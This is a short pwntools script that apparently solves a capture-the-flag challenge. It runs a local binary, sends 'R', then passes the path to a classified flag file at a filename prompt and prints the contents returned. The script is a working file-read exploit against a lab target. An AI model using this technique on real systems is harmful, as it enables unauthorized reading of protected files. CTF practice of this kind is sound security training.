from pwn import *

p = process("./share/chal")

p.sendline('R')
p.sendlineafter('Filename? ', './share/classified/flag')

flag = p.recvline()
log.info(flag)

p.close()
